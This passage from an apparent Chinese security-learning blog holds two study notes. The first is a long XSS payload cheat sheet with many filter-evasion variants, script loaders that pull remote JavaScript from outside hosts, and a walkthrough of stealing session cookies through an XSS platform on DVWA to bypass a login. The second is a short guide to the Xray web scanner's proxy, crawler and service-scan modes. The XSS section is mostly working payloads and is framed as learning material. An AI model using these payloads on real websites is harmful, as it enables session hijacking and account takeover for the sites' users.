javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&#x27;javascript:alert(1)&#x27;</span>&gt;aa&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>以下语句收集自网络，并未全部测试过</p><p>1、普通的 XSS JavaScript 注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://test.com/XSS/xss.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>2、IMG 标签 XSS 使用 JavaScript 命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=http://test.com/XSS/xss.js/&gt;</span><br></pre></td></tr></table></figure><p>3、IMG 标签无分号无引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>4、IMG 标签大小写不敏感</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=JaVaScRiPt:alert(&#x27;XSS&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>5、HTML 编码 (必须有分号)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(&quot;XSS&quot;)&gt;</span><br></pre></td></tr></table></figure><p>6、修正缺陷 IMG 标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img &quot;&quot;&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>7、formCharCode 标签 (计算器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=javascript:alert(String.fromCharCode(88,83,83))&gt;</span><br></pre></td></tr></table></figure><p>8、UTF-8 的 Unicode 编码 (计算器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=jav..省略..s&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>9、7 位的 UTF-8 的 Unicode 编码是没有分号的 (计算器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=jav..省略..S&#x27;)&gt;</span><br></pre></td></tr></table></figure><p>10、十六进制编码也是没有分号 (计算器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&amp;#x6A&amp;#x61&amp;#x76&amp;#x61..省略..&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;</span><br></pre></td></tr></table></figure><p>11、嵌入式标签，将 Javascript 分开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>12、嵌入式编码标签，将 Javascript 分开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>13、嵌入式换行符</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>14、嵌入式回车</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>15、嵌入式多行注入 JavaScript, 这是 XSS 极端的例子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;&gt;</span><br></pre></td></tr></table></figure><p>16、解决限制字符 (要求同页面)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&#x27;document.&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;write(&quot;&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;&lt;script&#x27;&lt;/script&gt;</span><br><span class="line">&lt;s cript&gt;z=z+&#x27; src=ht&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;tp://ww&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;w.shell&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;.ne t/1.&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&#x27;js&gt;&lt;/sc&#x27;&lt;/script&gt;&lt;script&gt;z=z+&#x27;ript&gt;&quot;)&#x27;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval_r(z)&lt; /script&gt;</span><br></pre></td></tr></table></figure><p>17、空字符 12-7-1 T00LS - Powered by Discuz! Board</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.test.com/viewthread.php?action=printable&amp;tid=15267 2/6perl -e &#x27;print &quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27; &gt; out</span><br></pre></td></tr></table></figure><p>18、Spaces 和 meta 前的 IMG 标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot; javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>19、双开括号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&lt;script&gt;alert(&quot;XSS&quot;);//&lt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>20、无结束脚本标记 (仅火狐等浏览器)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script srchttp://3w.org/XSS/xss.js?&lt;B&gt;</span><br></pre></td></tr></table></figure><p>21、无结束脚本标记 2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script SRC=//3w.org/XSS/xss.js&gt;</span><br></pre></td></tr></table></figure><p>22、半开的 HTML&#x2F;JavaScript XSS</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>23、双开角括号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=http://3w.org/XSS.html &lt;</span><br></pre></td></tr></table></figure><p>24、无单引号 双引号 分号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;a=/XSS/alert(a.source)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>25、换码过滤的 JavaScript</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\&quot;;alert(&#x27;XSS&#x27;);//</span><br></pre></td></tr></table></figure><p>26、结束 Title 标签</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/title&gt;&lt;script&gt;alert(&quot;XSS&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>27、Input Image</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input src=&quot;javascript:alert(&#x27;XSS&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure><p>28、ip 十进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a herf=&quot;http://3232235521′′&gt;XSS&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>29、ip 十六进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a herf=&quot;http://0xc0.0xa8.0×00.0×01′′&gt;XSS&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>30、ip 八进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a herf=&quot;http://0300.0250.0000.0001′′&gt;XSS&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>31、混合编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a herf=&quot;http://6 6.000146.0×7.147/&quot;&quot;&gt;XSS&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>32、节省 http:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a herf=&quot;//www.google.com/&quot;&gt;XSS&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>33、节省 www</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a herf=&quot;http://google.com/&quot;&gt;XSS&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>34、javascript 链接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a herf=&quot;javascript:document.location=&#x27;http://www.google.com/&#x27;&quot;&gt;XSS&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>35、绕符号过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a=&quot;&gt;&quot; src=&quot;http://3w.org/xss.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script =&quot;&gt;&quot; src=&quot;http://3w.org/xss.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script a=&quot;&gt;&quot; &quot; src=&quot;http://3w.org/xss.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script &quot;a=&#x27;&gt;&#x27;&quot; src=&quot;http://3w.org/xss.js&quot;&gt;&lt;/script</span><br><span class="line">&lt;script a=`&gt;` src=&quot;http://3w.org/xss.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>等等。。。。可以自行百度</p><h3 id="xss-常见利用"><a href="#xss-常见利用" class="headerlink" title="xss 常见利用"></a>xss 常见利用</h3><p>加载远程攻击的 payload</p><h4 id="常见的标准-payload"><a href="#常见的标准-payload" class="headerlink" title="常见的标准 payload"></a>常见的标准 payload</h4><p>注意 网站采用的协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://1.1.1.1/xss.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://1.1.1.1/xss.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>自动选择协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=//1.1.1.1/xss.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>图片创建加载连接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&#x27;&#x27;</span><br><span class="line">onerror=document.body.appendChild(document.createElement(&#x27;script&#x27;)).src=&#x27;//1.1.1.1/xss.</span><br><span class="line">js&#x27;&gt;</span><br></pre></td></tr></table></figure><p>字符拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=&#x27;document.&#x27;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;z=z+&#x27;write(&quot;&#x27;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;z=z+&#x27;&lt;script&#x27;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;z=z+&#x27; src=ht&#x27;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;z=z+&#x27;tp://www.&#x27;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;z=z+&#x27;xsstools&#x27;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;z=z+&#x27;.com/a&#x27;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;z=z+&#x27;mER&gt;&lt;/sc&#x27;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;z=z+&#x27;ript&gt;&quot;)&#x27;&lt;/script&gt; </span><br><span class="line">&lt;script&gt;eval(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>jquery 加载</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.getScript(&quot;//www.xsstools.com/amER&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>利用 xss 平台盗取 cookie 登录</p><p>将恶意代码插入存在漏洞的页面，当用户访问此网页时，浏览器会加载恶意的攻击代码，攻击代码会获取此时的 cookie 等信息，然后发送到攻击者指定的地址并记录下来</p><p>以 dvwa 为例</p><p>插入 xss 攻击平台生成的 payload</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637204235/Xnip2021-11-18_10-56-36_kfnimc.png"></p><p>用户登录后，访问这个带有恶意代码的网页，xss 攻击平台就会收到 cookie</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637204236/Xnip2021-11-18_10-57-01_wll6ss.png"></p><p>盗取 cookie 之后替换 cookie 即可绕过有登录验证的后台</p><h3 id="xss-绕过"><a href="#xss-绕过" class="headerlink" title="xss 绕过"></a>xss 绕过</h3><p>如果 gpc 开启的时候，特殊字符会被加上斜杠即，’变成 ‘ xss 攻击代码不要带用 单引号或双引号。</p><p>绕过 gpc 在 php 高 版本 gpc 默认是没有的，但是开发程序员会使用 addcslashes () 对特殊字符进行转义。</p><p>无法执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&#x27;http://www.test.com/JGdbsl?1623638390&#x27;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>正常执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://www.test.com/JGdbsl?1623638390&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>一般 xss 攻击平台都会提供多种 payload</p><h4 id="alert-过滤"><a href="#alert-过滤" class="headerlink" title="alert 过滤"></a>alert 过滤</h4><p>当页面过滤 alert 这个函数时，因为这个函数会弹窗，不仅很多程序会对他进行过滤，而且很多 waf 都会对其进行拦截。</p><p>只要不存在 alert 函数就可以绕过了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;prompt(/xss/);&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;confirm(1);&lt;/script&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=http://www.test.com/eciAKj?1623635663&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h4 id="过滤标签"><a href="#过滤标签" class="headerlink" title="过滤标签"></a>过滤标签</h4><p>在程序里如果使用 html 实体过滤 在 php 会使用 htmlspecialchars () 对输入的字符进行实体化，实体化之后的字符不会在 html 执行。把预定义的字符 “&lt;” (小于) 和 “&gt;” (大于) 转换为 HTML 实体，构造 xss 恶意代码大多数都必须使用 &lt; 或者 &gt;，这两个字符被实体化后在 html 里就不能执行了。</p><p>预定义的字符是:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&amp; (和号)成为 &amp;amp</span><br><span class="line">&quot; (双引号)成为 &amp;quot </span><br><span class="line">’ (单引号)成为&amp;#039 </span><br><span class="line">&lt; (小于)成为 &amp;lt </span><br><span class="line">&gt;(大于)成为 &amp;gt</span><br></pre></td></tr></table></figure><p>输出实体化</p><p><img src="https://res.cloudinary.com/lin1109/image/upload/v1637204782/Xnip2021-11-18_11-06-07_owjbdb.png"></p><p>只要避免出现这类标签即绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;username&quot; value=&quot;&quot; onclick=&quot;javascript:alert(&#x27;xss&#x27;);&quot;/&gt;</span><br></pre></td></tr></table></figure><p>ascii 编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>url 编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript:%61%6c%65%72%74%28%32%29&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>JS 编码 <a href="https://www.jb51.net/tools/zhuanhuan.htm">https://www.jb51.net/tools/zhuanhuan.htm</a></p><p>八进制编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(&quot;\141\154\145\162\164\50\61\51&quot;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>16 进制编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;eval(&quot;\x61\x6c\x65\x72\x74\x28\x31\x29&quot;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>jsunicode 编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(&#x27;xss&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>HTML 编码</p><p>在 &#x3D; 后可以解析 html 编码</p><p>十进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot; /&gt; &lt;button onclick=&quot;confirm(&#x27;7&amp;#39;);&quot;&gt;Button&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>十六进制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;x&quot; onerror=&quot;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&quot; /&gt;</span><br></pre></td></tr></table></figure><p>base64 编码</p><p>使用伪协议 base64 解码执行 xss</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h3 id="xss-挖掘"><a href="#xss-挖掘" class="headerlink" title="xss 挖掘"></a>xss 挖掘</h3><h4 id="反射型-xss-1"><a href="#反射型-xss-1" class="headerlink" title="反射型 xss"></a>反射型 xss</h4><p>1、寻找用户能够输入，在客户端可控的输入点。</p><p>2、输入恶意参数后，能够原型输出，输入没有过滤恶意代码</p><p>3、输入检测代码浏览器查看网页源码是否过滤，如果过滤了，过滤一般是实体过滤</p><h4 id="储存型-xss-1"><a href="#储存型-xss-1" class="headerlink" title="储存型 xss"></a>储存型 xss</h4><p>从客户端里获取留言记录，没有任何过滤，拼接到 SQL 语句里，再插入到数据 库中，当有人访问这个页面时，因为 $html 是直接输出的，没有任何过滤，所以能直接加载恶意代码。</p><h3 id="DOM-型-xss-1"><a href="#DOM-型-xss-1" class="headerlink" title="DOM 型 xss"></a>DOM 型 xss</h3><p>dom 型 xss 是用过改变 html 的属性或动作造成的 xss 型漏洞。</p><p>查找能操作 html 属性的函数，例如下面的一些函数</p><p>getElementById () 返回对拥有指定 id 的第一个对象的引用。</p><p>getElementsByName () 返回带有指定名称的对象集合。</p><p>getElementsByTagName () 返回带有指定标签名的对象集合。</p><p>getelementbyid.innerHTML 更改 html 的字符串和 js 输出的函数</p><p>document.write();</p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Xray 扫描器学习记录</title>
      <link href="/posts/485475556/"/>
      <url>/posts/485475556/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="https://cdn.jsdelivr.net/npm/meting/dist/Meting.min.js"></script><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>xray 是长亭科技研发的一款完善的安全评估工具，支持常见 Web 安全问题扫描和自定义 POC，虽然 Github 有项目，但是不开源，只提供社区版本供大家使用。</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><p><strong>代理模式</strong></p><p>代理模式下的基本架构为，扫描器作为中间人，首先原样转发流量，并返回服务器响应给浏览器等客户端，通讯两端都认为自己直接与对方对话，同时记录该流量，然后修改参数并重新发送请求进行扫描。这种原理和 Burpsuite 的自带的漏扫原理是一样的。</p><p><strong>生成 ca 证书</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray genca#  生成 ca 证书  运行之后会在当前文件夹生成 ca.crt 和 ca.key 两个文件</span><br></pre></td></tr></table></figure><p><strong>启用代理</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --listen 127.0.0.1:8888 --html-output test.html   #监听本地8888端口</span><br></pre></td></tr></table></figure><p><strong>爬虫模式</strong></p><p>爬虫模式是模拟人工去点击网页的链接，然后去分析扫描，和代理模式不同的是，爬虫不需要人工的介入，访问速度要快很多，但是也有一些缺点需要注意。</p><p>1、ray 的基础爬虫不能处理 js 渲染的页面</p><p>2、需要首先人工配置登录 cookie，必需的 http 头等，如果登录失败，也不容易发现问题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray webscan --basic-crawler http://testphp.vulnweb.com/ --html-output test.html</span><br></pre></td></tr></table></figure><p><strong>服务扫描</strong></p><p>xray 也支持服务扫描，目前的服务扫描的 POC 还不够多，目前只有一个 tomcat-cve-2020-1938 ajp 协议任意文件检测 poc。</p><p>参数配置目前比较简单，支持单个扫描与批量扫描:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray servicescan --target 127.0.0.1:8009 # 快速检测单个目标</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./xray servicescan --target-file test.file # 批量检查的 test.file 中的目标, 一行一个目标，带端口</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#test.file 格式</span><br><span class="line">192.168.0.1:8009</span><br><span class="line">127.0.0.1:8009</span><br></pre></td></tr></table></figure><p>也可以将结果输出到报告中，支持多种格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 将检测结果输出到 html 报告中</span><br><span class="line">➜ ./xray servicescan --target 127.0.0.1:8009 --html-output test.html</span><br><span class="line">➜ ./xray servicescan --target-file test.file --html-output test.html</span><br><span class="line"></span><br><span class="line"># 将检测结果输出到 json 文件中</span><br><span class="line">➜ ./xray servicescan --target 127.0.0.1:8099 --json-output test.json </span><br></pre></td></tr></table></figure><p>完整的 servicescan 用法可以使用下面命令查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">./xray servicescan --help</span><br><span class="line">NAME:</span><br><span class="line">    servicescan - Run a service scan task</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">    servicescan [command options] [arguments...]</span><br><span class="line"></span><br><span class="line">OPTIONS:</span><br><span class="line">   --target value          specify the target, for example: host:8009</span><br><span class="line">   --target-file value     load targets from a local file, one target a line</span><br><span class="line">   --json-output FILE      output xray results to FILE in json format</span><br><span class="line">   --webhook-output value  post xray result to url in json format</span><br><span class="line">   --html-output FILE      output xray result to FILE in HTML format</span><br></pre></td></tr></table></figure><p>更多用法移步至国光博客：<a href="https://www.sqlsec.com/2020/04/xray.html">https://www.sqlsec.com/2020/04/xray.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
